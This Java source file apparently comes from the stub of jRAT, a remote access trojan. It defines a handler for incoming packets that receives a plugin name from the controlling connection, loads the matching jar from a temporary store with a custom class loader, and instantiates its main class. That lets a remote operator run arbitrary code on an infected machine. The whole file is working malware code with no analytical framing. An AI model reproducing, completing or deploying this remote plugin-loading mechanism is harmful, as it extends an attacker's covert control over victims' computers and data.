package io.jrat.stub.packets.incoming;

import io.jrat.common.Logger;
import io.jrat.common.utils.JarUtils;
import io.jrat.stub.Connection;
import io.jrat.stub.Plugin;
import io.jrat.stub.PluginClassLoader;
import io.jrat.stub.packets.Temp;

import java.io.File;
import java.io.FileInputStream;
import java.util.jar.JarFile;
import java.util.jar.JarInputStream;


public class Packet101DownloadPlugin extends AbstractIncomingPacket {
	
	public Packet101DownloadPlugin() {
	
	}

	@Override
	public void read(Connection con) throws Exception {
		String name = con.readLine();		
		
		File file = Temp.MAP.get(name);
		
		FileInputStream fis = new FileInputStream(file);
		JarInputStream jis = new JarInputStream(fis);
		ClassLoader cl = new PluginClassLoader(this.getClass().getClassLoader(), jis);
		fis.close();
		jis.close();
		
		String mainClass;

		try {
			mainClass = JarUtils.getMainClassFromInfo(new JarFile(file));
		} catch (Exception ex) {
			ex.printStackTrace();
			Logger.log("Failed loading main class from plugin.txt, trying meta-inf");
			mainClass = JarUtils.getMainClass(new JarFile(file));
		}
		
		try {
			Plugin p = new Plugin();
			System.out.println(mainClass);

			Class<?> clazz = Class.forName(mainClass, true, cl);
			p.instance = clazz.newInstance();
			
			Plugin.addMethods(p, clazz);
			
			Plugin.list.add(p);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}
